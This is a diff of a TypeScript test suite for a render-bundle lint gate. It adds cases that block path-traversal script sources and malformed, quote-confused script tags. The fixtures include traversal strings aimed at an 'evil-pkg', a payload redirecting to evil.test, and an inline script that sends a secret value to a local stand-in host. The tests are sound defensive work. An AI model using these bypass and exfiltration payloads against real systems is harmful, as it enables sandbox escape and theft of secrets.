@@ -188,16 +188,23 @@ describe('lint-gate static and HyperFrames lint checks', () => {
     });
 
     it.each([
-        ['query string on gsap/dist traversal', 'gsap/dist/../../evil-pkg@1.0.0/x.js?v=1'],
-        ['backslash on gsap/dist traversal', 'gsap/dist/..\\..\\evil-pkg@1.0.0\\x.js'],
-        ['leading slash on gsap/dist traversal', '/gsap/dist/../../evil-pkg@1.0.0/x.js'],
-        ['HTML entity-encoded dots on gsap/dist traversal', 'gsap/dist/&#46;&#46;/&#46;&#46;/evil-pkg@1.0.0/x.js'],
+        ['query string on gsap/dist traversal', 'gsap/dist/../../evil-pkg@1.0.0/x.js?v=1', 'evil-pkg@1.0.0/x.js'],
+        ['backslash on gsap/dist traversal', 'gsap/dist/..\\..\\evil-pkg@1.0.0\\x.js', 'evil-pkg@1.0.0/x.js'],
+        ['leading slash on gsap/dist traversal', '/gsap/dist/../../evil-pkg@1.0.0/x.js', 'evil-pkg@1.0.0/x.js'],
+        [
+            'HTML entity-encoded dots on gsap/dist traversal',
+            'gsap/dist/&#46;&#46;/&#46;&#46;/evil-pkg@1.0.0/x.js',
+            'evil-pkg@1.0.0/x.js',
+        ],
+        ['trailing space on gsap/dist traversal', 'gsap/dist/../../evil-pkg@1.0.0/x.js ', 'evil-pkg@1.0.0/x.js'],
+        ['trailing tab on gsap/dist traversal', 'gsap/dist/../../evil-pkg@1.0.0/x.js\t', 'evil-pkg@1.0.0/x.js'],
+        ['leading space on gsap/dist traversal', ' b/gsap/dist/../../evil-pkg@1.0.0/x.js', 'b/evil-pkg@1.0.0/x.js'],
     ])(
         'blocks script src (%s) even when resolved target exists in bundle.Files (producer CDN rewrite bypass)',
-        async (_label, rawSrc) => {
+        async (_label, rawSrc, filePath) => {
             const bundle = makeBundleWithEntryContent(
                 `<!doctype html><html><body><script src="${rawSrc}"></script></body></html>`,
-                [{ Path: 'evil-pkg@1.0.0/x.js', Content: 'export const ok = 1;' }],
+                [{ Path: filePath, Content: 'export const ok = 1;' }],
             );
             const staged = await StageRenderBundle(bundle, { InjectPreamble: false });
             try {
@@ -211,36 +218,44 @@ describe('lint-gate static and HyperFrames lint checks', () => {
         },
     );
 
-    it('blocks <script title="a>b" src="p.bin"> with quoted > in attribute and scans .css bundle.Files loaded as scripts', async () => {
+    it('blocks <script title="a>b" src="p.bin">, stray-quote script tags (a/b/c), and scans .css bundle.Files loaded as scripts', async () => {
         const payloadBase64 = Buffer.from('window.location = "https://evil.test";', 'utf8').toString('base64');
-        const quotedGtBundle: RenderProjectBundle = {
-            Format: '16:9',
-            EntryFile: 'index.html',
-            Files: [
-                {
-                    Path: 'index.html',
-                    Content: '<!doctype html><html><body><script title="a>b" src="p.bin"></script></body></html>',
-                },
-            ],
-            Assets: [
-                {
-                    Key: 'p',
-                    RelativePath: 'p.bin',
-                    MimeType: 'application/octet-stream',
-                    DataBase64: payloadBase64,
-                },
-            ],
-            DataSnapshot: {},
-            Seed: 1,
-        };
-        const stagedGt = await StageRenderBundle(quotedGtBundle, { InjectPreamble: false });
-        try {
-            const res = await RunLintGate(quotedGtBundle, stagedGt.RootDir, new FakeRenderBackend());
-            expect(res.BlockRender).toBe(true);
-            expect(res.Passed).toBe(false);
-            expect(res.Issues.some((i) => i.Code === MJ_NON_BUNDLE_URL_CODE && i.File === 'index.html')).toBe(true);
-        } finally {
-            await stagedGt.Cleanup();
+        const malformedScriptSnippets = [
+            '<script title="a>b" src="p.bin"></script>',
+            '<script x=a" title="b>c" src=p.bin></script>',
+            '<script x=a" src=p.bin></script>',
+            '<script x=a">location=`http://127.0.0.1:8080/pairquote-inline?d=`+MJVideo.Data.Secret;//"></script>',
+        ];
+        for (const snippet of malformedScriptSnippets) {
+            const malformedBundle: RenderProjectBundle = {
+                Format: '16:9',
+                EntryFile: 'index.html',
+                Files: [
+                    {
+                        Path: 'index.html',
+                        Content: `<!doctype html><html><body>${snippet}</body></html>`,
+                    },
+                ],
+                Assets: [
+                    {
+                        Key: 'p',
+                        RelativePath: 'p.bin',
+                        MimeType: 'application/octet-stream',
+                        DataBase64: payloadBase64,
+                    },
+                ],
+                DataSnapshot: {},
+                Seed: 1,
+            };
+            const staged = await StageRenderBundle(malformedBundle, { InjectPreamble: false });
+            try {
+                const res = await RunLintGate(malformedBundle, staged.RootDir, new FakeRenderBackend());
+                expect(res.BlockRender).toBe(true);
+                expect(res.Passed).toBe(false);
+                expect(res.Issues.some((i) => i.Code === MJ_NON_BUNDLE_URL_CODE && i.File === 'index.html')).toBe(true);
+            } finally {
+                await staged.Cleanup();
+            }
         }
 
         const cssAsScriptBundle = makeBundleWithEntryContent(
